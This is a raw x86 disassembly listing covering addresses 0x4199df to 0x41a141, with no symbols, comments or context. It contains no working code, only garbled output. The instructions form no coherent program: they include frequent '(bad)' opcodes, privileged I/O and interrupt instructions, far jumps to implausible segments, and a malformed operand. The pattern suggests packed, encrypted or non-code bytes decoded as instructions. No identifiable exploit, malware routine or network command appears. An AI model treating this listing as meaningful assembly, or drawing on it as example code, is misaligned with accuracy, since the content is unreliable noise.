  4199df:	or     ebp,DWORD PTR [ecx+0x53]
  4199e2:	sub    eax,DWORD PTR [esi-0x7d57dfcb]
  4199e8:	div    BYTE PTR [edx+0x5f]
  4199eb:	lock inc ecx
  4199ed:	pop    ebp
  4199ee:	jp     0x4199d5
  4199f0:	cmc    
  4199f1:	and    esi,DWORD PTR [ebp-0x61c27cc1]
  4199f7:	xor    edx,ecx
  4199f9:	rol    DWORD PTR [ebx+edx*2],cl
  4199fc:	bnd jo 0x419a2b
  4199ff:	lock adc edi,DWORD PTR [eax]
  419a02:	and    eax,0xca4cb4ef
  419a07:	ja     0x419a5c
  419a09:	jno    0x419a73
  419a0b:	sbb    ecx,DWORD PTR [esi+0x6f]
  419a0e:	jb     0x4199d4
  419a10:	xlat   BYTE PTR ds:[ebx]
  419a11:	sub    edi,DWORD PTR [ecx]
  419a13:	ins    BYTE PTR es:[edi],dx
  419a14:	dec    ecx
  419a15:	dec    ebp
  419a17:	adc    BYTE PTR [edi+0x6e],dh
  419a1a:	inc    ebp
  419a1b:	cmp    dl,BYTE PTR [eax]
  419a1d:	dec    edi
  419a1e:	les    edi,FWORD PTR [edi+0x68]
  419a21:	push   ebp
  419a22:	jl     0x419a28
  419a24:	retf   0x2cb1
  419a27:	push   eax
  419a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a2a:	jno    0x419a96
  419a2c:	mov    al,ds:0x704b3e75
  419a31:	mov    DWORD PTR [ecx+0x71a9152a],0xd036d2ac
  419a3b:	fild   WORD PTR [edx-0x7c]
  419a3e:	sub    edx,DWORD PTR [esi-0x7e]
  419a41:	test   eax,0xacb37634
  419a46:	(bad)  
  419a47:	loop   0x4199f0
  419a49:	fcomp  DWORD PTR [ebx+0xe]
  419a4c:	call   0x4c6e3c7c
  419a51:	bound  edx,QWORD PTR [esi]
  419a53:	mov    ds:0x2fd58b9c,eax
  419a58:	icebp  
  419a59:	adc    esp,DWORD PTR [edx-0x3b]
  419a5c:	inc    edx
  419a5d:	adc    bh,BYTE PTR [edi-0x1d]
  419a60:	ins    BYTE PTR es:[edi],dx
  419a61:	or     eax,0x72dfa4b6
  419a66:	push   es
  419a67:	int    0xf2
  419a69:	int3   
  419a6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a6b:	bound  edi,QWORD PTR [esp+esi*8-0x58fb3e48]
  419a72:	pop    eax
  419a73:	into   
  419a74:	sti    
  419a75:	mov    bl,bh
  419a77:	daa    
  419a78:	mov    al,0xb2
  419a7a:	pop    esi
  419a7b:	xor    al,0x96
  419a7d:	adc    edi,DWORD PTR [edx+0x57]
  419a80:	(bad)  
  419a82:	inc    ecx
  419a83:	cdq    
  419a84:	out    dx,eax
  419a85:	mov    edi,0x25923459
  419a8a:	adc    BYTE PTR [edi],0x7
  419a8d:	xor    al,0x3a
  419a8f:	and    eax,0x975e9957
  419a94:	jmp    0x6ed1f7c8
  419a99:	cli    
  419a9a:	mov    dl,0xf0
  419a9c:	add    eax,0xa6418a35
  419aa1:	mov    al,0xfe
  419aa3:	loope  0x419b1e
  419aa5:	xchg   esp,eax
  419aa6:	pop    ebp
  419aa7:	mov    ds:0x499beffb,eax
  419aac:	push   cs
  419aad:	dec    esp
  419aae:	out    0x30,al
  419ab0:	mov    ss,WORD PTR [eax+esi*8+0x44e9e972]
  419ab7:	xor    BYTE PTR [esi+0x6d],0xb8
  419abb:	test   al,0x1
  419abd:	std    
  419abe:	pop    ecx
  419abf:	int    0x78
  419ac1:	shl    BYTE PTR [ebx+edx*4+0x40],1
  419ac5:	retf   0xdee0
  419ac8:	mov    al,0xb
  419aca:	shr    DWORD PTR [edx+0x23],1
  419acd:	dec    esp
  419ace:	call   FWORD PTR [esi+0x3d]
  419ad1:	gs je  0x419a70
  419ad4:	test   al,0x46
  419ad6:	push   esi
  419ad7:	sub    eax,0x6eae179d
  419adc:	mov    ah,0xd6
  419ade:	retf   
  419adf:	nop
  419ae0:	std    
  419ae1:	ret    0x5978
  419ae4:	ror    DWORD PTR [edi],0x39
  419ae7:	jp     0x419ac6
  419ae9:	xor    DWORD PTR [ecx-0x33],ebx
  419aec:	xchg   edi,eax
  419aed:	sti    
  419aee:	retf   
  419aef:	fadd   DWORD PTR [ecx]
  419af1:	mov    eax,ds:0x85343008
  419af6:	sar    DWORD PTR [esi-0x64],cl
  419af9:	or     al,0x9a
  419afb:	push   cs
  419afc:	test   esi,0xb7c7f517
  419b02:	imul   esi,DWORD PTR [ebp-0x3cb7dbce],0xffffff87
  419b09:	dec    edx
  419b0a:	mov    cs,WORD PTR [ecx]
  419b0c:	sbb    al,0xf0
  419b0e:	cli    
  419b0f:	je     0x419ab6
  419b11:	rcr    DWORD PTR [ebx+0x31],1
  419b14:	dec    ebp
  419b15:	jae    0x419ade
  419b17:	cwde   
  419b18:	leave  
  419b19:	push   esi
  419b1a:	das    
  419b1b:	xchg   ebp,eax
  419b1c:	outs   dx,DWORD PTR ds:[esi]
  419b1d:	(bad)  
  419b1f:	mov    eax,ds:0xa446ad48
  419b24:	pop    ecx
  419b25:	inc    esp
  419b26:	div    ebx
  419b28:	and    cl,BYTE PTR [ebx+eiz*2-0x1104a1ef]
  419b2f:	jns    0x419b84
  419b31:	jo     0x419b1d
  419b33:	xchg   esi,eax
  419b34:	mov    WORD PTR [ecx-0x7],gs
  419b37:	(bad)  
  419b38:	in     eax,dx
  419b39:	in     eax,0x5f
  419b3b:	leave  
  419b3c:	adc    ecx,DWORD PTR [ebp+0x37]
  419b3f:	cmp    al,0xeb
  419b41:	push   eax
  419b42:	lods   al,BYTE PTR ds:[esi]
  419b43:	pusha  
  419b44:	stos   DWORD PTR es:[edi],eax
  419b45:	push   ds
  419b46:	jle    0x419adb
  419b48:	xor    al,0x1a
  419b4a:	(bad)  
  419b4b:	adc    BYTE PTR [edi+0x8],cl
  419b4e:	(bad)  
  419b4f:	retf   
  419b50:	mov    al,0xee
  419b52:	or     DWORD PTR [ebp+ecx*1-0x583c1697],0x491c9eea
  419b5d:	push   DWORD PTR [ecx]
  419b5f:	iret   
  419b60:	dec    esp
  419b61:	add    ah,BYTE PTR [esi-0x47]
  419b64:	mov    esi,0xd28d9bec
  419b69:	(bad)  
  419b6a:	and    eax,0xf9a2900b
  419b6f:	mov    al,0x37
  419b71:	pop    esi
  419b72:	lock push 0xffffffa9
  419b75:	stos   DWORD PTR es:[edi],eax
  419b76:	loope  0x419b35
  419b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b79:	ret    
  419b7a:	int3   
  419b7b:	addr16 xchg ecx,eax
  419b7d:	(bad)  
  419b7e:	in     al,dx
  419b7f:	dec    ebx
  419b80:	int    0xdf
  419b82:	xchg   al,bh
  419b84:	mov    esp,0xdfe9781f
  419b89:	in     eax,0xca
  419b8b:	aas    
  419b8c:	cs hlt 
  419b8e:	je     0x419b89
  419b90:	dec    ebx
  419b91:	push   ecx
  419b92:	iret   
  419b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b94:	and    al,BYTE PTR [edx+0x3fa3fe]
  419b9a:	ins    DWORD PTR es:[edi],dx
  419b9b:	aas    
  419b9c:	sub    al,BYTE PTR [ecx-0x6a]
  419b9f:	xor    DWORD PTR [eax],0xffffff8f
  419ba2:	mov    cs,WORD PTR [ecx]
  419ba4:	jle    0x419b52
  419ba6:	mov    dh,0x20
  419ba8:	in     eax,0x8f
  419baa:	pop    ebp
  419bab:	in     al,dx
  419bac:	push   ebp
  419bad:	jge    0x419b77
  419baf:	imul   edx,ebp,0xf561e430
  419bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bb6:	push   edi
  419bb7:	mov    al,ds:0x6780f32
  419bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bbd:	cmp    al,0x22
  419bbf:	js     0x419bca
  419bc1:	jo     0x419bc9
  419bc3:	jge    0x419bcd
  419bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc7:	push   ss
  419bc8:	xor    BYTE PTR [edi],dl
  419bca:	popa   
  419bcb:	sub    DWORD PTR [esi+edi*2],eax
  419bce:	mov    eax,0xae69bc09
  419bd3:	stos   DWORD PTR es:[edi],eax
  419bd4:	stc    
  419bd5:	push   esp
  419bd6:	pop    edi
  419bd7:	lods   eax,DWORD PTR ds:[esi]
  419bd8:	sahf   
  419bd9:	jmp    0x419bd0
  419bdb:	cmp    DWORD PTR [eax+0x174e6d2c],0x28378505
  419be5:	mov    WORD PTR [edx-0x58],es
  419be8:	ins    BYTE PTR es:[edi],dx
  419be9:	int    0xe5
  419beb:	xor    cl,BYTE PTR [edi-0x4021975f]
  419bf1:	arpl   bp,di
  419bf3:	add    eax,0x3029c481
  419bf8:	ss xchg ebp,eax
  419bfa:	(bad)  
  419bfc:	sbb    bh,bh
  419bfe:	xchg   esi,eax
  419bff:	(bad)  
  419c00:	sti    
  419c01:	and    DWORD PTR [edi+0x600898e],ecx
  419c07:	paddsb mm4,QWORD PTR [edx+edx*4-0x4c637673]
  419c0f:	mov    DWORD PTR [edi],eax
  419c11:	and    ch,BYTE PTR [ecx]
  419c13:	mov    ah,0x89
  419c15:	mov    ds:0x64fef264,al
  419c1a:	sbb    al,0x10
  419c1c:	(bad)  
  419c1d:	ins    BYTE PTR es:[edi],dx
  419c1e:	mov    bl,0x20
  419c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c21:	test   DWORD PTR [edx],ebx
  419c23:	lahf   
  419c24:	xor    esi,DWORD PTR [ecx-0x5157e8c7]
  419c2a:	mov    bh,0x59
  419c2c:	popa   
  419c2d:	sar    DWORD PTR [edx-0x3ae4e5f],1
  419c33:	in     eax,dx
  419c34:	adc    al,0x8
  419c36:	jmp    0x453a:0x115c7319
  419c3d:	repz push es
  419c3f:	sbb    BYTE PTR [edi-0x68],bh
  419c42:	jns    0x419bed
  419c44:	popf   
  419c45:	dec    ecx
  419c46:	mov    ah,0xe3
  419c48:	inc    edx
  419c49:	pop    ecx
  419c4a:	push   es
  419c4b:	dec    ebx
  419c4c:	(bad)  
  419c4d:	outs   dx,DWORD PTR ds:[esi]
  419c4e:	and    ebp,DWORD PTR [eax-0x18]
  419c51:	iret   
  419c52:	dec    ecx
  419c53:	jecxz  0x419c24
  419c55:	ja     0x419cb9
  419c57:	fdiv   st,st(2)
  419c59:	adc    DWORD PTR [edi],ecx
  419c5b:	(bad)  
  419c5c:	test   DWORD PTR [ebx],0x868ab9da
  419c62:	adc    ebp,DWORD PTR [esi+0x74]
  419c65:	add    eax,0xaabbb60a
  419c6a:	into   
  419c6b:	mov    esi,0x25636dbd
  419c70:	sti    
  419c71:	(bad)  
  419c73:	je     0x419c05
  419c75:	jbe    0x419c99
  419c77:	cmp    DWORD PTR [ecx-0x33],esi
  419c7a:	aam    0xc0
  419c7c:	or     BYTE PTR [esi],bh
  419c7e:	pop    eax
  419c7f:	out    0xd0,al
  419c81:	adc    edx,DWORD PTR [edx]
  419c83:	cmp    edi,DWORD PTR [edi+ecx*8-0x34ee8a9d]
  419c8a:	add    eax,0xf282548c
  419c8f:	scas   al,BYTE PTR es:[edi]
  419c90:	js     0x419c4d
  419c92:	test   al,0xa3
  419c94:	sbb    eax,0xaea5a34f
  419c99:	imul   edx,ebp,0xffffff90
  419c9c:	out    dx,eax
  419c9d:	push   esi
  419c9e:	xor    eax,0xcff5d036
  419ca3:	shl    BYTE PTR [esi+0x1d],1
  419ca6:	pop    esp
  419ca7:	jbe    0x419c57
  419ca9:	cmc    
  419caa:	add    ecx,ebx
  419cac:	dec    esp
  419cad:	stc    
  419cae:	sahf   
  419caf:	aas    
  419cb0:	xor    eax,0x7456facd
  419cb5:	inc    esp
  419cb6:	xor    al,0x32
  419cb8:	test   DWORD PTR ds:0x6492f13c,0xa401a327
  419cc2:	or     DWORD PTR [ebp+0x37],ebx
  419cc5:	cmp    bl,BYTE PTR [edi+ebx*2-0x77]
  419cc9:	dec    edx
  419cca:	mov    edi,0x46fd3d1d
  419ccf:	push   0x805de69
  419cd4:	push   ebp
  419cd5:	in     al,0x17
  419cd7:	pop    ebx
  419cd8:	ss push 0xc2e0995b
  419cde:	les    ecx,FWORD PTR [esi-0x278f961b]
  419ce4:	sbb    dl,BYTE PTR [ebp+0x40]
  419ce7:	stos   BYTE PTR es:[edi],al
  419ce8:	lods   eax,DWORD PTR ds:[esi]
  419ce9:	cmp    BYTE PTR [ebp-0x9],cl
  419cec:	retf   0x6a23
  419cef:	mov    bh,0xd8
  419cf1:	jae    0x419d09
  419cf3:	outs   dx,DWORD PTR ds:[esi]
  419cf4:	enterw 0x208d,0xc9
  419cf9:	loopne 0x419c94
  419cfb:	in     eax,dx
  419cfc:	or     eax,0x9caa4c0d
  419d01:	xor    edi,edx
  419d03:	and    DWORD PTR [ebp-0x6026e685],ebx
  419d09:	bound  esi,QWORD PTR [esi+eiz*4]
  419d0c:	xchg   ebx,eax
  419d0d:	fist   WORD PTR [esi+0x5d05fc83]
  419d13:	push   ss
  419d14:	mov    edx,0xfa780913
  419d19:	push   edi
  419d1a:	ins    BYTE PTR es:[edi],dx
  419d1b:	add    al,0xb7
  419d1d:	idiv   DWORD PTR [esp+eiz*4-0x7681f401]
  419d24:	pop    eax
  419d25:	mov    ecx,ebx
  419d27:	js     0x419cd0
  419d29:	mov    esi,0xc4ecd497
  419d2e:	pusha  
  419d2f:	cmp    DWORD PTR [edi-0x4b],ebx
  419d32:	in     al,dx
  419d33:	les    ecx,FWORD PTR [edi-0xf]
  419d36:	or     BYTE PTR [ecx-0x5fb1ee3d],dh
  419d3c:	jge    0x419d8a
  419d3e:	fs cmp ebp,esp
  419d41:	clc    
  419d42:	shl    BYTE PTR [edx-0x5f],cl
  419d45:	test   DWORD PTR [edi-0x2a],0x221595f9
  419d4c:	push   esp
  419d4d:	sbb    ecx,DWORD PTR [ecx+0x18c6cb40]
  419d53:	aas    
  419d54:	mov    ebx,DWORD PTR [edi+0x2e]
  419d57:	mov    dh,0xb9
  419d59:	inc    eax
  419d5a:	les    ebx,FWORD PTR [edi]
  419d5c:	scas   eax,DWORD PTR es:[edi]
  419d5d:	pop    eax
  419d5e:	or     ch,BYTE PTR [ebx-0xb]
  419d61:	gs lock int3 
  419d64:	mov    esp,0x572ab215
  419d69:	hlt    
  419d6a:	loope  0x419d9d
  419d6c:	or     DWORD PTR [ebx],ebp
  419d6e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d70:	xor    bl,BYTE PTR ds:0x8dc51857
  419d76:	nop
  419d77:	mov    DWORD PTR [esi],ecx
  419d79:	rol    BYTE PTR [ebp+0x2d1ccd17],0xab
  419d80:	xchg   ecx,eax
  419d81:	xchg   esi,eax
  419d82:	daa    
  419d83:	loop   0x419d0d
  419d85:	push   ebp
  419d86:	pop    esi
  419d87:	es dec eax
  419d89:	xchg   DWORD PTR [eax],esp
  419d8b:	retf   
  419d8c:	std    
  419d8d:	push   eax
  419d8e:	sbb    eax,DWORD PTR [edi-0x54]
  419d91:	clc    
  419d92:	fstp   QWORD PTR [edx+ebx*4-0x2d5905a2]
  419d99:	xchg   esi,eax
  419d9a:	ret    0xf25b
  419d9d:	and    esp,DWORD PTR [ebx+0x3]
  419da0:	jnp    0x419d67
  419da2:	xor    DWORD PTR [edi-0x9],ebx
  419da5:	push   esp
  419da6:	cli    
  419da7:	fld    st(2)
  419da9:	push   ebp
  419daa:	or     eax,ebx
  419dac:	mov    esi,0x61e6320e
  419db1:	lahf   
  419db2:	(bad)
  419db5:	mov    esp,0x75ffc5b8
  419dba:	(bad)  
  419dbb:	popf   
  419dbc:	push   ebp
  419dbd:	lds    esi,FWORD PTR [edi+0x27cfad99]
  419dc3:	pop    ebx
  419dc4:	jo     0x419e3a
  419dc6:	jl     0x419dbf
  419dc8:	mov    dl,BYTE PTR [edi]
  419dca:	outs   dx,BYTE PTR ds:[esi]
  419dcb:	mov    ebp,0x99414bb0
  419dd0:	jle    0x419d67
  419dd2:	cs leave 
  419dd4:	xor    al,0xb7
  419dd6:	in     al,dx
  419dd7:	aas    
  419dd8:	add    ch,BYTE PTR [edx-0x1]
  419ddb:	jg     0x419d81
  419ddd:	fiadd  WORD PTR [esi-0x166d74b]
  419de3:	mov    ds:0x5be116cf,eax
  419de8:	xchg   bl,dh
  419dea:	jbe    0x419e2c
  419dec:	retf   0x45a0
  419def:	sbb    eax,0x9096702f
  419df4:	adc    al,0x65
  419df6:	fldenv [ecx]
  419df8:	pop    ecx
  419df9:	mov    ch,0x85
  419dfb:	lds    ecx,FWORD PTR [ecx]
  419dfd:	mov    dh,0xe9
  419dff:	ret    
  419e00:	add    ah,cl
  419e02:	fidiv  WORD PTR [eax]
  419e04:	jl     0x419e11
  419e06:	mov    ds:0x461ba6fc,al
  419e0b:	push   ss
  419e0c:	jnp    0x419e3f
  419e0e:	sahf   
  419e0f:	test   BYTE PTR [ecx],bh
  419e11:	fwait
  419e12:	adc    bh,ch
  419e14:	cmp    eax,0x9c4c1e63
  419e19:	(bad)  
  419e1a:	out    0x7e,eax
  419e1c:	arpl   bp,ax
  419e1e:	jmp    0x4562:0x3bba9ee5
  419e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e26:	pop    edx
  419e27:	jmp    FWORD PTR [ecx+0x76]
  419e2a:	mov    ds:0xccbcfbce,eax
  419e2f:	out    dx,al
  419e30:	sbb    DWORD PTR [ebx+edx*2],esi
  419e33:	cmp    BYTE PTR [esi*4-0xf8d0e34],al
  419e3a:	jmp    0x2567c45c
  419e3f:	sbb    BYTE PTR [edi+0x121b817a],0x96
  419e46:	fbstp  TBYTE PTR [edx+0x7274c4e3]
  419e4c:	xchg   ebp,eax
  419e4d:	jne    0x419e66
  419e4f:	test   eax,0x6a749074
  419e54:	jno    0x419e16
  419e56:	adc    dh,BYTE PTR [ebp+0x41378370]
  419e5c:	mov    al,0xd2
  419e5e:	mov    al,ds:0x53617bcd
  419e63:	addr16 jbe 0x419e34
  419e66:	bound  edx,QWORD PTR [edx-0x1e21ce20]
  419e6c:	dec    eax
  419e6d:	into   
  419e6e:	add    ah,cl
  419e70:	add    ecx,DWORD PTR [ecx]
  419e72:	add    ah,dl
  419e74:	(bad)  
  419e75:	aad    0x96
  419e77:	popf   
  419e78:	xchg   ebp,eax
  419e79:	mov    ah,0x69
  419e7b:	cmovb  eax,DWORD PTR [eax]
  419e7e:	xchg   esp,eax
  419e7f:	xchg   BYTE PTR [ebx-0xd637414],bl
  419e85:	retf   
  419e86:	jns    0x419ea2
  419e88:	adc    DWORD PTR [esi+0x7],0x4f127cce
  419e8f:	in     al,0xa8
  419e91:	mov    es,WORD PTR [esi]
  419e93:	pop    es
  419e94:	pop    ss
  419e95:	jmp    0x419e47
  419e97:	retf   
  419e98:	lds    esp,FWORD PTR [esi+0x318d0d8d]
  419e9e:	dec    eax
  419e9f:	mov    dh,0x49
  419ea1:	cmp    edx,ebx
  419ea3:	lea    ecx,[edi]
  419ea5:	ss out 0x12,eax
  419ea8:	imul   eax,DWORD PTR [ecx+0x79bf4d64],0x4
  419eaf:	ret    0x2c42
  419eb2:	ins    DWORD PTR es:[edi],dx
  419eb3:	add    BYTE PTR [esi-0x74479efd],dh
  419eb9:	shl    bl,cl
  419ebb:	cmp    eax,0xd9496cc9
  419ec0:	add    ebx,DWORD PTR [eax+0x61]
  419ec3:	push   esi
  419ec4:	out    0x5e,al
  419ec6:	out    dx,al
  419ec7:	jne    0x419eba
  419ec9:	and    ch,bl
  419ecb:	push   0x95e73026
  419ed0:	dec    edx
  419ed1:	inc    ebp
  419ed2:	sbb    eax,edi
  419ed4:	pop    ebp
  419ed5:	jp     0x419f28
  419ed7:	(bad)  
  419ed8:	retf   
  419ed9:	in     al,dx
  419eda:	test   eax,0x5bde763d
  419edf:	lds    edx,FWORD PTR [ebp+0x737b715f]
  419ee5:	fmul   QWORD PTR [edi]
  419ee7:	icebp  
  419ee8:	sbb    BYTE PTR es:[esi],0xa
  419eec:	pop    edi
  419eed:	push   ss
  419eee:	not    bl
  419ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ef1:	sub    al,BYTE PTR [ebp+0x78dfe732]
  419ef7:	pop    eax
  419ef8:	pop    ds
  419ef9:	mov    eax,ds:0x336a9ae
  419efe:	sub    DWORD PTR [edx-0x18],edi
  419f01:	push   ebx
  419f02:	int3   
  419f03:	mov    esi,0xd04aa956
  419f08:	jbe    0x419f1a
  419f0a:	cs retf 0x685c
  419f0e:	imul   esi,edx,0x3d
  419f11:	call   DWORD PTR [esi+0x43]
  419f14:	mov    WORD PTR [eax],cs
  419f16:	mov    bl,0x64
  419f18:	popa   
  419f19:	xor    ah,BYTE PTR [ebx+0x47]
  419f1c:	int3   
  419f1d:	xor    eax,0x973355ea
  419f22:	outs   dx,BYTE PTR ds:[esi]
  419f23:	adc    ebp,edx
  419f25:	add    al,0x8
  419f27:	and    ebx,DWORD PTR [ecx+0x7e93b020]
  419f2d:	call   0x9565:0x1e11b19f
  419f34:	push   ebx
  419f35:	bound  esp,QWORD PTR [eax]
  419f37:	xlat   BYTE PTR ds:[ebx]
  419f38:	pop    ss
  419f39:	outs   dx,DWORD PTR ds:[esi]
  419f3a:	(bad)  
  419f3b:	aad    0xbf
  419f3d:	mov    edi,DWORD PTR [esi]
  419f3f:	fisubr DWORD PTR [edi+0x1fb17228]
  419f45:	(bad)  
  419f46:	fnsave [esi-0x52]
  419f49:	(bad)  
  419f4a:	(bad)  
  419f4b:	pop    ds
  419f4c:	nop
  419f4d:	stc    
  419f4e:	jne    0x419f1a
  419f50:	js     0x419ee4
  419f52:	xchg   esi,eax
  419f53:	mov    ds:0x2cbc580,al
  419f58:	sub    edi,DWORD PTR [edx]
  419f5a:	pop    es
  419f5b:	sub    al,0x8e
  419f5d:	dec    ebx
  419f5e:	lock mov eax,0x7f35343b
  419f64:	cmp    eax,eax
  419f66:	nop
  419f67:	fs aas 
  419f69:	push   esp
  419f6a:	mov    WORD PTR [eax-0x5a],ds
  419f6d:	mov    ds:0xe0623653,al
  419f72:	lea    edx,[eax+0x6c]
  419f75:	test   eax,0x73912778
  419f7a:	clc    
  419f7b:	jmp    0x3598:0xb2d6f8a7
  419f82:	dec    ebx
  419f83:	xchg   DWORD PTR [edi],edx
  419f85:	cmp    DWORD PTR ds:0xe2bbc767,esp
  419f8b:	sbb    DWORD PTR [eax+0x0],0xffffff9a
  419f8f:	mov    eax,ds:0xdcce4edd
  419f94:	inc    eax
  419f95:	sub    al,0xe2
  419f97:	inc    ebx
  419f98:	sub    ecx,DWORD PTR [edi]
  419f9a:	fsub   st,st(1)
  419f9c:	inc    ecx
  419f9d:	bound  ebp,QWORD PTR [ebx-0x6bec63cb]
  419fa3:	push   edx
  419fa4:	int    0x3f
  419fa6:	mov    ebp,esp
  419fa8:	cmp    dh,BYTE PTR [esi-0x371f5935]
  419fae:	mov    ebx,0xaadfd954
  419fb3:	in     eax,dx
  419fb4:	or     al,0x87
  419fb6:	xor    eax,DWORD PTR [ebx-0x69]
  419fb9:	push   0x12
  419fbb:	and    bh,dl
  419fbd:	sbb    BYTE PTR [ecx+0x7d8d7a3a],ah
  419fc3:	enter  0x6335,0x64
  419fc7:	dec    ebx
  419fc8:	add    eax,0x94c04e28
  419fcd:	dec    esi
  419fce:	xor    bh,ah
  419fd0:	jo     0x41a026
  419fd2:	test   DWORD PTR [ecx-0x80],edi
  419fd5:	scas   eax,DWORD PTR es:[edi]
  419fd6:	out    0x3c,eax
  419fd8:	cli    
  419fd9:	leave  
  419fda:	push   edi
  419fdb:	or     ah,al
  419fdd:	jge    0x419fbc
  419fdf:	xchg   ecx,eax
  419fe0:	pop    edi
  419fe1:	add    BYTE PTR [ecx+esi*2+0x21],0x85
  419fe6:	dec    edx
  419fe7:	add    eax,0x59af2ee3
  419fec:	sub    cl,BYTE PTR [edx+0x4c5440a8]
  419ff2:	pop    eax
  419ff3:	sub    BYTE PTR [ebx+0x19],0xa3
  419ff7:	jecxz  0x41a045
  419ff9:	sbb    al,0xeb
  419ffb:	cdq    
  419ffc:	dec    edi
  419ffd:	das    
  419ffe:	mov    ?,WORD PTR [esp+ecx*4+0x0]
  41a002:	fs pop es
  41a004:	xchg   edi,eax
  41a005:	pop    edx
  41a006:	mov    ebp,0xbaa628dd
  41a00b:	jo     0x419ff2
  41a00d:	push   esp
  41a00e:	ins    DWORD PTR es:[edi],dx
  41a00f:	fstp   QWORD PTR [ebx+0x6d]
  41a012:	sbb    BYTE PTR [ecx+0x75552738],bh
  41a018:	pop    ss
  41a019:	mov    WORD PTR [ebp+0x41],gs
  41a01c:	cmp    DWORD PTR [esi],esp
  41a01e:	ret    
  41a01f:	xchg   esp,eax
  41a020:	clc    
  41a021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a022:	push   es
  41a023:	fs dec ebp
  41a025:	ror    BYTE PTR [ebx-0x22],1
  41a028:	mov    ah,BYTE PTR [eax-0x34dff172]
  41a02e:	call   0x6b9a:0xf7cc587d
  41a035:	shl    BYTE PTR [edi+0x3e],0x5a
  41a039:	scas   eax,DWORD PTR es:[edi]
  41a03a:	(bad)  
  41a03b:	in     al,dx
  41a03c:	call   0x5c1e:0xee076f73
  41a043:	lahf   
  41a044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a045:	outs   dx,BYTE PTR ds:[esi]
  41a046:	add    DWORD PTR [eax],edx
  41a048:	inc    ebp
  41a049:	mov    edi,0xdf9e0227
  41a04e:	aas    
  41a04f:	dec    esp
  41a050:	call   0x22e5:0xd7d77820
  41a057:	es shl ch,1
  41a05a:	mov    dl,BYTE PTR [eax+0x2a]
  41a05d:	gs loopne 0x41a01f
  41a060:	out    0xb,al
  41a062:	mov    cl,0xfd
  41a064:	or     DWORD PTR [eax],esp
  41a066:	dec    ebx
  41a067:	mov    WORD PTR [esi-0x65],fs
  41a06a:	mov    ch,0xcd
  41a06c:	add    BYTE PTR [ebp+0x0],ch
  41a06f:	mov    bl,0xee
  41a071:	push   esp
  41a072:	sub    esp,ebx
  41a074:	inc    edi
  41a075:	inc    ebx
  41a076:	ins    DWORD PTR es:[edi],dx
  41a077:	xchg   esi,eax
  41a078:	sbb    DWORD PTR [ecx],ecx
  41a07a:	into   
  41a07b:	lds    ebx,FWORD PTR [eax]
  41a07d:	mov    WORD PTR [edi+0x3c],ds
  41a080:	or     DWORD PTR [edx+eiz*8-0xb],edx
  41a084:	inc    edi
  41a085:	dec    edi
  41a086:	lods   eax,DWORD PTR ds:[esi]
  41a087:	sbb    eax,0x4dafaac4
  41a08c:	sbb    eax,0x35b91c83
  41a091:	and    al,0x7a
  41a093:	xchg   BYTE PTR [ebp-0x654c2477],ch
  41a099:	cdq    
  41a09a:	aam    0x9c
  41a09c:	int3   
  41a09d:	jg     0x41a105
  41a09f:	xchg   esi,eax
  41a0a0:	jge    0x41a075
  41a0a2:	xchg   edx,eax
  41a0a3:	dec    ecx
  41a0a4:	in     al,dx
  41a0a5:	cli    
  41a0a6:	ins    BYTE PTR es:[edi],dx
  41a0a7:	mov    bl,0x42
  41a0a9:	dec    edx
  41a0aa:	scas   eax,DWORD PTR es:[edi]
  41a0ab:	sbb    al,0x2c
  41a0ad:	xchg   ebp,edi
  41a0af:	sbb    BYTE PTR [eax],ah
  41a0b1:	loop   0x41a047
  41a0b3:	pushw  cs
  41a0b5:	imul   ecx
  41a0b7:	rcr    DWORD PTR [eax+ebp*1-0x67],0x51
  41a0bc:	push   esp
  41a0bd:	mov    ecx,0xf02020d0
  41a0c2:	sti    
  41a0c3:	iret   
  41a0c4:	test   al,0x9d
  41a0c6:	cmc    
  41a0c7:	dec    ebp
  41a0c8:	mov    DWORD PTR [edx-0x1d],esp
  41a0cb:	loope  0x41a0a0
  41a0cd:	mov    si,0xfc4b
  41a0d1:	or     ebp,DWORD PTR ds:0x72e543e5
  41a0d7:	out    dx,eax
  41a0d8:	pop    es
  41a0d9:	jnp    0x41a137
  41a0db:	(bad)
  41a0de:	stc    
  41a0df:	mov    bh,0x53
  41a0e1:	xor    ecx,ecx
  41a0e3:	mov    dl,bl
  41a0e5:	(bad)  
  41a0e7:	and    al,0x3e
  41a0e9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41a0eb:	je     0x41a0f9
  41a0ed:	aad    0x2
  41a0ef:	inc    eax
  41a0f0:	addr16 dec edx
  41a0f2:	in     al,dx
  41a0f3:	fistp  DWORD PTR [edx]
  41a0f5:	pop    edx
  41a0f6:	jmp    0x7876:0x5446a043
  41a0fd:	pop    edi
  41a0fe:	test   BYTE PTR [ecx+0x137dc46f],dh
  41a104:	mov    edx,0x9e86056
  41a109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a10a:	mov    ebp,0xc81df8b1
  41a10f:	mov    edx,0x808ba6d1
  41a114:	jp     0x41a119
  41a116:	enter  0xfe5d,0x14
  41a11a:	ds pop esi
  41a11c:	sub    eax,0xd5d2f8b4
  41a121:	in     al,dx
  41a122:	mov    ds:0xf0c72fd8,al
  41a127:	loopne 0x41a0b7
  41a129:	jecxz  0x41a161
  41a12b:	mov    cl,0xd6
  41a12d:	push   edx
  41a12e:	icebp  
  41a12f:	mov    WORD PTR [eax-0x2ef8463a],ss
  41a135:	div    DWORD PTR ss:[edi]
  41a138:	hlt    
  41a139:	adc    BYTE PTR [edi-0x5b],bl
  41a13c:	mov    ecx,0xdad36264
  41a141:	cs imul ebp,esp,0x86b591d6
